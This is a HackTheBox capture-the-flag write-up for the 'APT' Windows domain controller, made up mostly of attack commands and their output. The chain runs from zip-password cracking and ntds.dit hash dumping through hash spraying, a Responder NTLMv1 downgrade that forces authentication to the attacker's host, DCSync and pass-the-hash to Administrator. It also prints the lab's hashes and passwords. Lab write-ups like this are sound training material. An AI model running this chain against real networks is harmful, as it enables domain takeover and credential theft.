@@ -1,0 +1,693 @@
+---
+layout: menu
+title: "HTB APT"
+description: "10.10.10.213 | 50 pts"
+header-img: "boxes/screenshots/49_unbalanced/unbalanced.png"
+tags: [hackthebox, htb, boot2root, writeup, windows, APT, apt]
+---
+
+:filesdir: /boxes/files/66_APT/
+:imagesdir: /boxes/screenshots/66_APT/
+:page-liquid:
+:source-highlighter: rouge
+
++++<h1 style="color:red">+++ HTB APT (10.10.10.213) +++</h1>+++
+
+---
+
+:toc: 
+:toc-title: TABLE OF CONTENTS
+
+---
+
+== PART 1 : INITIAL RECON
+
+=== 1.1 NMAP scan
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ nmap --min-rate 3000 -oN nmap-tcp.initial -p- -Pn -T4 -v 10.10.10.213
+  
+  Host is up.
+  All 65535 scanned ports on 10.10.10.213 are filtered
+
+  Read data files from: /usr/bin/../share/nmap
+  Nmap done: 1 IP address (1 host up) scanned in 65.54 seconds
+
+----
+____
+
+No open port was found but scanning using IPv6 might yield a different result. But first, the IPv6 of the machine needs to be determined. It could be done using +++<span style="color:orange">+++ link:https://github.com/mubix/IOXIDResolver[IOXIDResolver] +++</span>+++:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ git clone https://github.com/mubix/IOXIDResolver.git
+
+$ python3 IOXIDResolver/IOXIDResolver.py -t 10.10.10.213
+
+  [*] Retrieving network interface of 10.10.10.213
+  Address: apt
+  Address: 10.10.10.213
+  Address: dead:beef::b885:d62a:d679:573f
+  Address: dead:beef::cda5:800b:148e:6594
+----
+____
+
+Adding the recovered IPv6 addresses to the +++<span style="color:orange">+++ `*/etc/hosts*` +++</span>+++ file then attempting to scan using the new hostname:
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+##dead:beef::b885:d62a:d679:573f	apt.htb##
+----
+
+[source,shell,subs="verbatim,quotes"]
+----
+$ nmap -6 --min-rate 3000 -oN nmap6-tcp.initial -p- -Pn -T4 -v apt.htb
+
+  PORT      STATE SERVICE
+  53/tcp    open  domain
+  80/tcp    open  http
+  135/tcp   open  msrpc
+  389/tcp   open  ldap
+  445/tcp   open  microsoft-ds
+  464/tcp   open  kpasswd5
+  593/tcp   open  http-rpc-epmap
+  636/tcp   open  ldapssl
+  5985/tcp  open  wsman
+  9389/tcp  open  adws
+  47001/tcp open  winrm
+
+$ nmap -6 -oN nmap6-tcp -p 53,80,135,389,445,464,593,636,5985,9389,47001 -sC -sV -v apt.htb
+
+  PORT      STATE SERVICE      VERSION
+  53/tcp    open  domain       Simple DNS Plus
+  80/tcp    open  http         Microsoft IIS httpd 10.0
+  | http-methods: 
+  |   Supported Methods: OPTIONS TRACE GET HEAD POST
+  |_  Potentially risky methods: TRACE
+  |_http-server-header: Microsoft-IIS/10.0
+  |_http-title: Gigantic Hosting | Home
+  135/tcp   open  msrpc        Microsoft Windows RPC
+  389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+  | ssl-cert: Subject: commonName=apt.htb.local
+  | Subject Alternative Name: DNS:apt.htb.local
+  | Issuer: commonName=apt.htb.local
+  | Public Key type: rsa
+  | Public Key bits: 2048
+  | Signature Algorithm: sha256WithRSAEncryption
+  | Not valid before: 2020-09-24T07:07:18
+  | Not valid after:  2050-09-24T07:17:18
+  | MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
+  |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
+  |_ssl-date: 2021-04-09T11:25:05+00:00; 0s from scanner time.
+  445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+  464/tcp   open  kpasswd5?
+  593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+  636/tcp   open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+  | ssl-cert: Subject: commonName=apt.htb.local
+  | Subject Alternative Name: DNS:apt.htb.local
+  | Issuer: commonName=apt.htb.local
+  | Public Key type: rsa
+  | Public Key bits: 2048
+  | Signature Algorithm: sha256WithRSAEncryption
+  | Not valid before: 2020-09-24T07:07:18
+  | Not valid after:  2050-09-24T07:17:18
+  | MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
+  |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45
+  |_ssl-date: 2021-04-09T11:25:05+00:00; 0s from scanner time.
+  5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+  |_http-server-header: Microsoft-HTTPAPI/2.0
+  |_http-title: Not Found
+  9389/tcp  open  mc-nmf       .NET Message Framing
+  47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+  |_http-server-header: Microsoft-HTTPAPI/2.0
+  |_http-title: Not Found
+  Service Info: Host: APT; OS: Windows; CPE: cpe:/o:microsoft:windows
+  
+  Host script results:
+  |_clock-skew: mean: -11m59s, deviation: 26m49s, median: 0s
+  | smb-os-discovery: 
+  |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+  |   Computer name: apt
+  |   NetBIOS computer name: APT\x00
+  |   Domain name: htb.local
+  |   Forest name: htb.local
+  |   FQDN: apt.htb.local
+  |_  System time: 2021-04-09T12:24:49+01:00
+  | smb-security-mode: 
+  |   account_used: <blank>
+  |   authentication_level: user
+  |   challenge_response: supported
+  |_  message_signing: required
+  | smb2-security-mode: 
+  |   2.02: 
+  |_    Message signing enabled and required
+  | smb2-time: 
+  |   date: 2021-04-09T11:24:51
+  |_  start_date: 2021-04-09T07:46:49
+
+----
+____
+
+Open ports have now been determined and it seems like the machine is part of an Active Directory.
+
+=== 1.2 Updating /etc/hosts
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+dead:beef::b885:d62a:d679:573f	##apt.htb.local HTB.local## apt.htb
+----
+____
+
+This might be essential when enumerating/connecting to the machine.
+
+---
+
+== PART 2 : PORT ENUMERATION
+
+=== TCP PORT 80 : HTTP
+
+image::80_landing_page.png[GiganticHosting]
+
+=== TCP PORT 445 : SMB
+
+Enumerating available shares from anonymous login:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ smbclient -L \\\\apt.htb -N                 
+
+  Anonymous login successful
+
+  	  Sharename       Type      Comment
+  	  ---------       ----      -------
+	  ##backup          Disk##      
+	  IPC$            IPC       Remote IPC
+	  NETLOGON        Disk      Logon server share 
+	  SYSVOL          Disk      Logon server share 
+  apt.htb is an IPv6 address -- no workgroup available
+
+$ smbclient \\\\apt.htb\\backup -N
+
+  smb: \> dir
+    .                                   D        0  Thu Sep 24 03:30:52 2020
+    ..                                  D        0  Thu Sep 24 03:30:52 2020
+    ##backup.zip##                          A 10650961  Thu Sep 24 03:30:32 2020
+----
+____
+
+There is a +++<span style="color:orange">+++backup.zip+++</span>+++ file publicly available in the +++<span style="color:orange">+++backup+++</span>+++ share.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ smbget -a -R smb://apt.htb/backup/backup.zip
+
+  Using workgroup WORKGROUP, guest user
+  smb://apt.htb/backup/backup.zip
+  Downloaded 10.16MB in 37 seconds
+
+$ unzip backup.zip
+
+  Archive:  backup.zip
+     creating: Active Directory/
+  ##[backup.zip] Active Directory/ntds.dit password:##
+
+$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+
+  PASSWORD FOUND!!!!: pw == iloveyousomuch
+----
+____
+
+The +++<span style="color:orange">+++backup.zip+++</span>+++ file was successfully downloaded from the file share but trying to extract the contents requires a password. Luckily, the password was susceptible to a dictionary attack which returned the password as +++<span style="color:orange">+++iloveyousomuch+++</span>+++. Successfully extracting the contents reveals the following files:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ unzip backup.zip
+
+  Archive:  backup.zip
+  [backup.zip] Active Directory/ntds.dit password: ##iloveyousomuch##
+    inflating: Active Directory/ntds.dit  
+    inflating: Active Directory/ntds.jfm  
+     creating: registry/
+    inflating: registry/SECURITY       
+    inflating: registry/SYSTEM
+
+$ find . -type f -exec file {} + 2>/dev/null | grep -v backup
+
+  ./Active Directory/ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x6f146ad6, page size 8192, Windows version 10.0
+  ./Active Directory/ntds.jfm: data
+  ./registry/SECURITY:         MS Windows registry file, NT/2000 or above
+  ./registry/SYSTEM:           MS Windows registry file, NT/2000 or above
+----
+____
+
+There's an +++<span style="color:orange">+++ntds.dit+++</span>+++ file which is a database file storing Active Directory data especially user objects and password hashes; however, it's encrypted. Along with this are Windows Registry files.
+
+---
+
+=== PART 3: EXPLOITATION
+
+==== 3.1 Search for valid users
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -outputfile user_hashes.txt LOCAL
+
+$ ls -l
+
+  -rwxrwxrwx 1 root root   176132 xxx  x xx:xx  user_hashes.txt.ntds
+  -rwxrwxrwx 1 root root      136 xxx  x xx:xx  user_hashes.txt.ntds.cleartext
+  -rwxrwxrwx 1 root root   433995 xxx  x xx:xx  user_hashes.txt.ntds.kerberos
+----
+____
+
+The extraction is only possible since the password encryption key used for +++<span style="color:orange">+++ntds.dit+++</span>+++ is encrypted using the BOOTKEY which could be found on the SYSTEM registry hive. Otherwise, if the SYSTEM hive is not available, the bootkey could be provided as an argument to +++<span style="color:orange">+++secretsdump+++</span>+++ module of impacket.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ cat user_hashes.txt.ntds | head -n 1
+
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+
+$ cat user_hashes.txt.ntds | head -n 1 | cut -d':' -f1
+
+  Administrator
+
+$ cat user_hashes.txt.ntds | cut -d':' -f1 > ../usernames.txt
+
+$ ./kerbrute_linux_amd64 userenum -d htb.local --dc apt.htb.local -o kerbrute.txt -v usernames.txt
+      __             __               __     
+     / /_____  _____/ /_  _______  __/ /____ 
+    / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+   / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+  /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+  Version: v1.0.3 (9dad6e1) - xx/xx/xx - Ronnie Flathers @ropnop
+
+  xxxx/xx/xx xx:xx:xx >  Using KDC(s):
+  xxxx/xx/xx xx:xx:xx >  	apt.htb.local:88
+  [...omitted...]
+
+$ cat kerbrute.txt | grep VALID
+
+  xxxx/xx/xx xx:xx:xx >  [+] VALID USERNAME:	 Administrator@htb.local
+  xxxx/xx/xx xx:xx:xx >  [+] VALID USERNAME:	 APT$@htb.local
+  xxxx/xx/xx xx:xx:xx >  [+] VALID USERNAME:	 henry.vinson@htb.local
+----
+____
+
+The usernames were trimmed from the password hashes recovered in +++<span style="color:orange">+++ntds.dit+++</span>+++ via `*impacket-secretsdump*`. The usernames were then passed through `*kerbrute*` to check if they were still valid/active users in the domain controller. As for that, three users were found -- +++<span style="color:orange">+++Administrator+++</span>+++, +++<span style="color:orange">+++APT$+++</span>+++, and +++<span style="color:orange">+++henry.vinson+++</span>+++.
+
+=== 3.2 Generating a Kerberos Ticket for henry.vinson
+
+The hashes found for the valid users doesn't seem to work when attempting to login via winrm. Since this box seems to be part of an Active Directory, maybe forging a kerberos ticket will work for authenticating into the machine. 
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ cat user_hashes.txt.ntds | grep henry.vinson
+
+  henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f:::
+
+$ cat user_hashes.txt.ntds | grep henry.vinson | awk -F':' '{printf "%s:%s\n",$3,$4}'
+
+  aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f
+
+$ cat user_hashes.txt.ntds | awk -F':' '{printf "%s:%s\n",$3,$4}' | sort | uniq > ../hashes.txt
+
+$ for i in $(cat hashes.txt); do echo $i; attempt=$(impacket-getTGT HTB.local/henry.vinson@apt.htb -hashes $i); if ! [[ $attempt == *"SessionError"* ]]; then echo "HASH FOUND: [$i]"; echo $attempt; break; fi; done
+
+  [...omitted...]
+  HASH FOUND: [aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb]
+  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+  [*] Saving ticket in henry.vinson@apt.htb.ccache
+
+$ klist -c henry.vinson@apt.htb.ccache                                                                         1 ⨯
+
+  Ticket cache: FILE:henry.vinson@apt.htb.ccache
+  Default principal: henry.vinson@HTB.LOCAL
+
+  Valid starting       Expires              Service principal
+  04/09/2021 16:34:58  04/10/2021 02:34:58  krbtgt/HTB.LOCAL@HTB.LOCAL
+  	  renew until 04/10/2021 16:34:58
+----
+____
+
+The shell script below was the one-liner used to brute force the generation of the ticket:
+____
+[source,sh,subs="verbatim,quotes"]
+----
+for i in $(cat hashes.txt); do 
+    echo $i; 
+    attempt=$(impacket-getTGT HTB.local/henry.vinson@apt.htb -hashes $i); 
+    
+    if ! [[ $attempt == *"SessionError"* ]]; then 
+        echo "HASH FOUND: [$i]"; 
+        echo $attempt;
+        break; 
+    fi; 
+done
+----
+____
+
+A password spray (in this case, hashes extracted from ntds.dit were used) was attempted for the user, +++<span style="color:orange">+++henry.vinson+++</span>+++, and one of the hashes (not his own) was found to be able to forge a krbtgt ticket. However, this still does not seem to work for authentication via WinRM.
+
+=== 3.3 Dumping HKEY_USERS 
+
+The HKU registry hive contains all configurations set for all active users.
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ export KRB5CCNAME=henry.vinson@apt.htb.ccache
+
+$ env | grep KRB5
+  
+  KRB5CCNAME=henry.vinson@apt.htb.ccache
+
+$ impacket-reg -k apt.htb.local query -keyName HKU -s > registry.txt
+----
+____
+
+In this case, since there is already a cached ticket for henry.vinson, all contents from his user registry hive will be extracted.
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ cat registry.txt | grep -i -A5 -B5 -E 'henry$'
+
+  [...omitted...]
+  \Software\GiganticHostingManagementSystem\
+	        ##UserName	REG_SZ	 henry.vinson_adm##
+	        ##PassWord	REG_SZ	 G1#Ny5@2dvht##
+  [...omitted...]
+----
+____
+
+And within the extracted information are stored credentials for the deployed service, `*GiganticHostingManagementSystem*`.
+
+---
+
+== PART 4 : GENERATING A USER SHELL (henry.vinson_adm)
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ evil-winrm -i apt.htb -u henry.vinson_adm -p 'G1#Ny5@2dvht' --no-colors
+
+PS C:\Users\henry.vinson_adm\Documents> whoami
+
+  htb\henry.vinson_adm
+
+PS C:\Users\henry.vinson_adm\Documents> ipconfig
+
+  Windows IP Configuration
+
+
+  Ethernet adapter Ethernet:
+
+     Connection-specific DNS Suffix  . :
+     IPv6 Address. . . . . . . . . . . : dead:beef::3d05:a1a8:4a51:c2fe
+     IPv6 Address. . . . . . . . . . . : dead:beef::b885:d62a:d679:573f
+     Link-local IPv6 Address . . . . . : fe80::3d05:a1a8:4a51:c2fe%5
+     IPv4 Address. . . . . . . . . . . : 10.10.10.213
+     Subnet Mask . . . . . . . . . . . : 255.255.255.0
+     Default Gateway . . . . . . . . . : dead:beef::1
+                                         fe80::250:56ff:feb9:75a0%5
+                                         10.10.10.2
+
+PS C:\Users\henry.vinson_adm\Documents> dir ..\Desktop
+
+      Directory: C:\Users\henry.vinson_adm\Desktop
+
+
+  Mode                LastWriteTime         Length Name
+  ----                -------------         ------ ----
+  -ar---       xx/xx/xxxx  xx:xx XX             34 user.txt
+----
+____
+
+It seems like the reason why the other users cannot authenticate via WinRM even though a valid hash has been found is that they are not part of the +++<span style="color:orange">+++Remote Management Users+++</span>+++ group:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+PS C:\Users\henry.vinson_adm\Documents> net localgroup "Remote Management Users"
+
+  Alias name     Remote Management Users
+  Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+
+  Members
+
+  -------------------------------------------------------------------------------
+  henry.vinson_adm
+----
+____
+
+---
+
+== PART 5 : PRIVILEGE ESCALATION (henry.vinson_adm -> Administrator)
+
+=== 5.1 The console history of henry.vinson_adm
+
+Checking the console history of the current user:
+____
+[source,shell,subs="verbatim,quotes"]
+----
+PS C:\Users\henry.vinson_adm\Documents> cd ..\AppData
+
+PS C:\Users\henry.vinson_adm\AppData> type Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+----
+____
+____
+[source,ps1,subs="verbatim,quotes"]
+----
+$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
+----
+____
+
+The DWORD value for `*lmcompatibilitylevel*` was set to `*2*` and based on the Microsoft documentation for LAN Manager authentication level:
+
+[cols="1,3,8"]
+|===
+|DWORD |Setting |Description
+
+| 2
+| Send NTLM response only
+| Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication.
+|===
+
+With this the machine should only repond with NTLMv1 hashes during authentication.
+
+=== 5.2 Intercepting NTLMv1 Hashes
+
+Setting up `*responder*` with a custom challeng, "1122334455667788"
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ cat /etc/responder/Responder.conf | grep -i challenge
+
+  ; Custom challenge. 
+  ; Use "Random" for generating a random challenge for each requests (Default)
+  Challenge = 1122334455667788
+
+$ sudo responder -I tun0 --lm
+
+                                           __
+    .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+    |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+    |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                     |__|
+
+             NBT-NS, LLMNR & MDNS Responder 3.0.2.0
+
+    Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+    To kill this script hit CTRL-C
+
+    [...omitted...]
+    [+] Servers:
+        [...omitted...]
+        SMB server                 [ON]
+    [...omitted...]
+
+    [+] Poisoning Options:
+        [...omitted...]
+        Force LM downgrade         [ON]
+    [...omitted...]
+
+    [+] Generic Options:
+        Responder NIC              [tun0]
+        Responder IP               [10.10.14.11]
+        Challenge set              [1122334455667788]
+    [...omitted...]
+----
+____
+
+Then forcing the target machine to force NTLM authentication:
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+PS C:\Users\henry.vinson_adm\AppData> cd "C:\ProgramData\Microsoft\Windows Defender\platform"
+
+PS C:\ProgramData\Microsoft\Windows Defender\platform> dir
+
+
+      Directory: C:\ProgramData\Microsoft\Windows Defender\platform
+
+
+  Mode                LastWriteTime         Length Name
+  ----                -------------         ------ ----
+  d-----       11/10/2020  11:09 AM                4.18.2010.7-0
+  d-----        3/17/2021   3:13 PM                4.18.2102.4-0
+
+PS C:\ProgramData\Microsoft\Windows Defender\platform> cd 4.18.2010.7-0
+
+C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.11\file.txt
+----
+____
+
+Looking back in the running `*responder*`, the NTLMv1 hash for the computer account was retrieved:
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+[SMB] NTLMv1 Client   : 10.10.10.213
+[SMB] NTLMv1 Username : HTB\APT$
+[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
+[...omitted...]
+----
+____
+____
+[source,console,subs="verbatim,quotes"]
+----
+PS C:\Users\henry.vinson_adm\Documents> Get-ADComputer "APT"
+
+  DistinguishedName : CN=APT,OU=Domain Controllers,DC=htb,DC=local
+  DNSHostName       : apt.htb.local
+  Enabled           : True
+  Name              : APT
+  ObjectClass       : computer
+  ObjectGUID        : a78acf4d-42b5-49bc-9855-2389a80e726d
+  SamAccountName    : APT$
+  SID               : S-1-5-21-2993095098-2100462451-206186470-1001
+  UserPrincipalName :
+----
+____
+
+
+Going to link:https://crack.sh/get-cracking/[crack.sh] and submitting the value, +++<span style="color:orange">+++NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384+++</span>+++, will return the following if the hash was successfully cracked:
+
+____
+[source,console,subs="verbatim,quotes"]
+----
+Token: $NETNTLM$1122334455667788$95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
+Key: d167c3238864b12f5f82feae86a7f798
+----
+____
+
+=== 5.3 Running impacket-secretsdump to obtain password hashes
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 'HTB.local/APT$@apt.htb'     
+
+  Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+  [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+  [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+  [*] Using the DRSUAPI method to get NTDS.DIT secrets
+  ##Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::##
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
+  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
+  henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
+  APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
+  [*] Kerberos keys grabbed
+  Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
+  Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
+  Administrator:des-cbc-md5:0816d9d052239b8a
+  krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
+  krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
+  krbtgt:des-cbc-md5:f8c26238c2d976bf
+  henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
+  henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
+  henry.vinson:des-cbc-md5:73b6f71cae264fad
+  henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
+  henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
+  henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
+  APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
+  APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
+  APT$:des-cbc-md5:76c45245f104a4bf
+  [*] Cleaning up... 
+----
+____
+
+=== 5.4 Shell as Administrator
+
+____
+[source,shell,subs="verbatim,quotes"]
+----
+$ evil-winrm -i apt.htb -u Administrator -H c370bddf384a691d811ff3495e8a72e2 --no-colors
+
+PS C:\Users\Administrator\Documents> whoami
+
+  htb\administrator
+
+PS C:\Users\Administrator\Documents> dir ..\Desktop
+
+
+      Directory: C:\Users\Administrator\Desktop
+
+
+  Mode                LastWriteTime         Length Name
+  ----                -------------         ------ ----
+  -ar---        4/10/2021   9:11 AM             34 root.txt
+
+
+PS C:\Users\Administrator\Documents> ipconfig
+
+  Windows IP Configuration
+
+
+  Ethernet adapter Ethernet:
+
+     Connection-specific DNS Suffix  . :
+     IPv6 Address. . . . . . . . . . . : dead:beef::3d05:a1a8:4a51:c2fe
+     IPv6 Address. . . . . . . . . . . : dead:beef::b885:d62a:d679:573f
+     Link-local IPv6 Address . . . . . : fe80::3d05:a1a8:4a51:c2fe%5
+     IPv4 Address. . . . . . . . . . . : 10.10.10.213
+     Subnet Mask . . . . . . . . . . . : 255.255.255.0
+     Default Gateway . . . . . . . . . : dead:beef::1
+                                         fe80::250:56ff:feb9:75a0%5
+                                         10.10.10.2
+----
+____
+
+---
+---
+
+== REFERENCES
+- https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/
+- https://adsecurity.org/?p=2398
+- https://www.lifewire.com/hkey-users-2625903
+- https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level 
